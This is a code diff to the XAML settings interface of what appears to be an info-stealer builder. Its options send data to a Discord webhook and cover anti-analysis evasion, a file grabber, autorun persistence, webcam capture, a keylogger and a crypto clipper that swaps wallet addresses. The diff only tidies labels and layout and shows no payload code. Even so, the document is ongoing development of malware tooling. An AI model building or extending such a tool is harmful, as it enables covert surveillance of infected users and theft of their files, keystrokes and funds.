@@ -45,7 +45,7 @@
                     <Label Content="Discord Webhook URL:" Target="{Binding ElementName=WebhookUrlTextBox}"/>
                     <TextBox Name="WebhookUrlTextBox"   TextChanged="WebhookUrlTextBox_TextChanged" />
                     <!-- Test Webhook Button -->
-                    <Button Name="TestWebhookButton" Content="Test Webhook" Width="120" Margin="0,10,0,0" HorizontalAlignment="Center" Click="TestWebhookButton_Click" />
+                    <ui:Button Name="TestWebhookButton" Content="Test Webhook" Width="120" Margin="0,10,0,0" HorizontalAlignment="Center" Click="TestWebhookButton_Click"/>
                     <!-- Webhook Status Label -->
                     <ui:InfoBar Name="WebhookStatusLabel" Margin="0,10,0,0"/>
                 </StackPanel>
@@ -55,18 +55,18 @@
                     <ScrollViewer VerticalScrollBarVisibility="Auto">
                         <StackPanel Orientation="Vertical" HorizontalAlignment="Left">
                             <TextBlock Text="Configuration Options" FontWeight="Bold" FontSize="14" Margin="0,0,0,10"/>
-                            <CheckBox Name="DebugCheckBox" Content="Debug all exceptions to file?" Margin="0,5,0,0"/>
-                            <CheckBox Name="AntiAnalysisCheckBox" Content="Use anti analysis?" />
-                            <CheckBox Name="StartDelayCheckBox" Content="Use random start delay?" />
-                            <CheckBox Name="GrabberCheckBox" Content="File Grabber ?" Margin="0,10,0,0"/>
+                            <CheckBox Name="DebugCheckBox" Content="Debug all exceptions to file" Margin="0,5,0,0"/>
+                            <CheckBox Name="AntiAnalysisCheckBox" Content="Use anti analysis" />
+                            <CheckBox Name="StartDelayCheckBox" Content="Use random start delay" />
+                            <CheckBox Name="GrabberCheckBox" Content="File Grabber"/>
                             <!-- Startup Options CheckBox -->
-                            <CheckBox Name="StartupCheckBox" Content="Install autorun?" Margin="0,10,0,0" Checked="StartupCheckBox_Checked" Unchecked="StartupCheckBox_Unchecked"/>
+                            <CheckBox Name="StartupCheckBox" Content="Install autorun" Checked="StartupCheckBox_Checked" Unchecked="StartupCheckBox_Unchecked"/>
 
                             <!-- Startup Options Panel (Initially Hidden) -->
-                            <StackPanel Name="StartupOptionsPanel" Visibility="Collapsed" Margin="0,10,0,0" VerticalAlignment="Top">
-                                <CheckBox Name="WebcamScreenshotCheckBox" Content="Create webcam screenshots?" />
-                                <CheckBox Name="KeyloggerCheckBox" Content="Install keylogger?" />
-                                <CheckBox Name="ClipperCheckBox" Content="Install clipper?" Checked="ClipperCheckBox_Checked" Unchecked="ClipperCheckBox_Unchecked" />
+                            <StackPanel Name="StartupOptionsPanel" Visibility="Collapsed" Margin="30,0,0,0" VerticalAlignment="Top">
+                                <CheckBox Name="WebcamScreenshotCheckBox" Content="Create webcam screenshots" />
+                                <CheckBox Name="KeyloggerCheckBox" Content="Install keylogger" />
+                                <CheckBox Name="ClipperCheckBox" Content="Install clipper" Checked="ClipperCheckBox_Checked" Unchecked="ClipperCheckBox_Unchecked" />
                             </StackPanel>
 
                             <!-- Clipper Addresses Panel (Initially Hidden) -->
